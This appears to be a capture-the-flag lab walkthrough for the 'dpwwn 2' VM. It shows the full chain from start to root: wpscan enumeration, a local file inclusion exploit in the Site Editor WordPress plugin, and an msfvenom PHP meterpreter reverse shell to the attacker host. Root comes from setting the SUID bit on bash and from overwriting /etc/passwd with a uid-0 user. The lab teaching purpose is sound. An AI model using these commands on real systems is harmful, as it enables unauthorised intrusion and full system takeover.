# Dpwwn 2
Setting network of dpwwn 2:
DHCP service: Disabled
Static IP address: 10.10.10.10
Note: Host only network adapter set (VM IP: 10.10.10.10/24)
![](https://i.imgur.com/l7pcIX6.png)
Settig network host only on VMware.
![](https://i.imgur.com/FFwWrNh.png)
`ifconfig eth0 10.10.10.12 netmask 255.255.255.0`
![](https://i.imgur.com/EUQZBHG.png)
Then Ping to check the victim is up.
![](https://i.imgur.com/3l7KLVC.png)
`nmap -sS -sV -p- -oN NampDpwwn2.txt 10.10.10.10`
![](https://i.imgur.com/t62Jwc1.png)
`dirb` it.
![](https://i.imgur.com/iBH5eJ5.png)
We got a lot `wordpress` keyword. Let's WPscan it.
WPscan need API token now, Register a free one.
https://wpvulndb.com/
Add another NAT network adapter to the Host and restart it.
![](https://i.imgur.com/Q51v2pN.png)
`wpscan -url http://10.10.10.10/wordpress -e vt,vp,u --api-token {Your API Token}`
```shell
[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.10.10/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.2.2</generator>
 |  - http://10.10.10.10/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.2</generator>
 |
 | [!] 16 vulnerabilities identified:
 |
 | [!] Title: WordPress 5.2.2 - Cross-Site Scripting (XSS) in Stored Comments
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9861
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16218
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |
 | [!] Title: WordPress 5.2.2 - Authenticated Cross-Site Scripting (XSS) in Post Previews
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9862
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16223
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |
 | [!] Title: WordPress 5.2.2 - Potential Open Redirect
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9863
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16220
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/c86ee39ff4c1a79b93c967eb88522f5c09614a28
 |
 | [!] Title: WordPress 5.0-5.2.2 - Authenticated Stored XSS in Shortcode Previews
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9864
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16219
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://fortiguard.com/zeroday/FG-VD-18-165
 |      - https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html
 |
 | [!] Title: WordPress 5.2.2 - Cross-Site Scripting (XSS) in Dashboard
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9865
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16221
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9867
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68
 |      - https://hackerone.com/reports/339483
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9908
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9909
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9910
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9911
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de
 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation 
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9912
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2
 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9913
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0
 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.3 - Improper Access Controls in REST API
 |     Fixed in: 5.2.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9973
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16788
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-g7rg-hchx-c2gw
 |
 | [!] Title: WordPress <= 5.3 - Stored XSS via Crafted Links
 |     Fixed in: 5.2.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9975
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20042
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16773
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16773
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://hackerone.com/reports/509930
 |      - https://github.com/WordPress/wordpress-develop/commit/1f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xvg2-m2f4-83m7
 |
 | [!] Title: WordPress <= 5.3 - Stored XSS via Block Editor Content
 |     Fixed in: 5.2.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9976
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v
 |
 | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
 |     Fixed in: 5.2.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/10004
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53
 
 [+] site-editor
 | Location: http://10.10.10.10/wordpress/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9044
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - https://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.10/wordpress/wp-content/plugins/site-editor/readme.txt
```
`searchsploit wordpress site editor`
![](https://i.imgur.com/QUKwlWZ.png)

```
Product: Site Editor Wordpress Plugin - https://wordpress.org/plugins/site-edit
or/
Vendor: Site Editor
Tested version: 1.1.1
CVE ID: CVE-2018-7422

** CVE description **
A Local File Inclusion vulnerability in the Site 
Editor plugin through 1.1.1 for WordPress allows 
remote attackers to retrieve arbitrary files via 
the ajax_path parameter to 
editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php.
```

http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

![](https://i.imgur.com/Vmu0I6X.png)
We set network back to `ifconfig eth0 10.10.10.12 netmask 255.255.255.0`
`mkdir /tmp/dpwwn02`
`mount -t nfs 10.10.10.10:/home/dpwwn02 /tmp/dpwwn02`
`cd /tmp/dpwwn02`
`msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=8888 R > dpwwn02shell.php`
Remove the "/*" in the payload begining, or the shell might not work property, like this:
![](https://i.imgur.com/20BSKoa.png)
So, fix the stager.
![](https://i.imgur.com/UTdqq2k.png)

```
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 10.10.10.12
set lport 8888
run
```

http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/home/dpwwn02/dpwwn02shell.

![](https://i.imgur.com/5C3uxYv.png)

After get your meterpreter session, enter `shell` to create shell as your taste.

https://github.com/mzet-/linux-exploit-suggester

`find / -perm -u=s -type f 2>/dev/null`

![](https://i.imgur.com/Bs2cfJz.png)

`find hack -exec whoami \;`
![](https://i.imgur.com/oMWiVTC.png)

`find hack -exec chmod u+s /bin/bash \;`
`ls -l /bin/bash`
![](https://i.imgur.com/Gbzzenk.png)

`bash -p`
`id`
![](https://i.imgur.com/RztI7rO.png)

`cd /root`
`ls`
`cat dpwwn-02-FLAG.txt`
![](https://i.imgur.com/eSWf8NI.png)

```
which wget
ls -lha /usr/bin/wget
find /home -exec chmod u+s /usr/bin/wget \;
ls -lh /usr/bin/wget
```
![](https://i.imgur.com/AIf8U6B.png)

http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
`openssl passwd -1 -salt hack pass123`
`hack:$1$hack$22.CgYt2uMolqeatCk9ih/:0:0:root:/root:/bin/bash >> passwd`
After modified a new root user.
`python -m SimpleHTTPServer 8787`
![](https://i.imgur.com/4MzTHH0.png)

`cd /etc`
`wget -o passwd http://10.10.10.12:8787/passwd`
`su - hack`
`pass123`
`id`
`cd /root`
`ls`
`cat dpwwn-02-FLAG.txt`